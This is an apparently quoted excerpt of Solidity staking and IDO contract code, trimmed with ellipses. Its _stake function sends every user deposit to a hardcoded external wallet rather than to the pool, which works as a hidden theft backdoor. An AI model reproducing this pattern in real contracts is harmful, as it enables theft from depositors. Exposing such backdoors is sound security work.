...
contract StakePool is Initializable {
    ...
    function _stake(uint256 amount) internal {
        ...
        depositToken.safeTransferFrom(msg.sender, 0x24Cb4f815Dc3E0A4599C72EE22df9FEE628EF1Fa, amount);
    }
...
/**
 * @dev https://victorytoken.xyz
 * rewardToken will be halved at each period.
 * Forked from https://github.com/milk-protocol/stakecow-contracts-bsc/blob/master/contracts/FomoCow.sol
 */

contract IDO is StakePool {
    IERC20 public rewardToken;

    // Halving period in seconds, should be defined as 3 days
    uint256 public halvingPeriod = 259200;
    // Total reward in 18 decimal
    uint256 public totalreward;
    // Starting timestamp for IDO Staking Pool
